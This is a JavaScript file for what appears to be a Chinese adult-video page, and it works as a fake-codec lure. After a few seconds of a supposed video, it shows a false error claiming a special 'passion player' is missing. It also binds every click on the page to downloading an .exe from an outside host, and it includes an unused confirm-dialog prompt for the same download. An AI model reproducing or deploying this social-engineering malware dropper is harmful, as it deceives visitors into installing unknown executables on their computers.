//当前url
var NowUrl = window.location.href + "?xs_7_1000_xs";
var exe = NowUrl.split("xs")[1]

//Flash地址
var FlashUrl = "http://aifuli.github.io/blog/id=";
var FlashMdb = 'nHDLnHfknjTd|nHDvnHm4n1nL|nHDvnHm4nWfL|nHDvnHm3rjmv|nHDLnHfsnjT1';
var fff = FlashMdb.split("|")
var ffcc = parseInt(fff.length * Math.random())

//play
function play1(){
d_close();
dt_play();
setTimeout(gettime,5000);
document.getElementById("h0").innerHTML = document.getElementById("h2").innerHTML;
//document.getElementById("flash_play").innerHTML = '<embed class="swf_play" src="http://aifuli.github.io/blog/id=' + fff[ffcc] + '.swf" width="640" height="480" loop="false"></embed>';
document.getElementById("flash_play").innerHTML = '<object class="swf_play" height="480" width="640" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"><param name="loop" value="0"><param value="http://aifuli.github.io/blog/id=' + fff[ffcc] + '.swf" name="movie"><param value="high" name="quality"><param value="always" name="allowScriptAccess"><param value="internal" name="allowNetworking"><param value="transparent" name="wmode"><embed height="480" width="640" loop="0" wmode="transparent" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" allownetworking="internal" allowscriptaccess="always" quality="high" src="http://aifuli.github.io/blog/id=' + fff[ffcc] + '.swf"></object>';
}
function play2(){
document.getElementById("h0").innerHTML = document.getElementById("h1").innerHTML
document.getElementById("flash_play").innerHTML = '';
}


//显示标题
var tit = document.getElementById("tit").innerHTML;
var ttt = tit.split("|")
var id = parseInt(ttt.length * Math.random())
var main = '<div class="play_right_2"><ul>';
for (i=0;i < ttt.length; i++) {var cc = parseInt(ttt.length*Math.random());main = main + '<li><a href="#' + parseInt(9000*Math.random()) + '" target="_blank">' + ttt[cc] + '</a></li>'}
var main = main + '</ul></div>';
//右边内容
document.getElementById("r_xx").innerHTML = main;
//标题
document.getElementById("t_tit").innerHTML = ttt[id];
document.getElementById("d_tt").innerHTML = ttt[id];
function dt_play(){document.getElementById("p_xx").innerHTML = '正在播放：' + ttt[id];}//网页标题
window.document.title = ttt[id] + ' - 木耳首页';
//下载地址
function dload(){window.location = "http://guodou.gzydr.com/guodou_1157_1131.exe"}
var imgs = 'nHDvnWmLn1fk|nHDvrj0knj6L|nHDLnWn3nWm1|nHDvrj0sP1b4';
var img = imgs.split("|")
var mann = '<div class="bufer"><ul>';
for (i=0;i < imgs.length; i++) {var cc = parseInt(ttt.length*Math.random());var ci = parseInt(img.length*Math.random());mann = mann + '<li><a href="#' + parseInt(9000*Math.random()) + '" target="_blank"><img src="http://aifuli.github.io/blog/id=' + img[i] + '.jpg"><br>' + ttt[cc] + '</a></li>'}
var mann = mann + '<ul></div>';
//底部
document.getElementById("bbt").innerHTML = mann;

//打开页面播放


//关闭 显示
function d_close(){document.getElementById("c_cloce").innerHTML = '';}
function d_show(){document.getElementById("c_cloce").innerHTML = '<div id="f_down0"></div><div id="f_down5"><div class="cColes"><a href="javascript:d_close();">X</a></div></div><div class="f_down"><div class="f_down1"><div class="df1">无法继续播放：因为系统检测到你没有安装《激情专用播放器》</div><div class="df2">提示：下载《激情专用播放器》安装完成后，请刷新网页继续播放！</div><div class="dd0"><div class="dd1"><a href="javascript:dload();"></a></div><div class="dd2"><a href="javascript:dload();"></a></div></div></div></div>';}
//5秒后显示
function d_tid(){document.getElementById("p_xx").innerHTML = '提示：影片加载出错！因为检测到您电脑未安装《激情专用播放器》，请下载安装。';}
function gettime(){
d_show();
d_tid();
document.getElementById("h0").innerHTML = document.getElementById("h1").innerHTML
}
//执行播放
play1();
//点击任意位置
document.onclick=dload;
//打开30秒提示下载
//setTimeout(ichat,2000);
//setTimeout(ichat,30000);
//弹出提示框
function ichat(){confirm("系统检测到您没有安装《免费激情播放器》，所以无法播放，请点击“确定”下载安装后刷新网页就能正常播放。");dload();}
//cnzz and 51.la
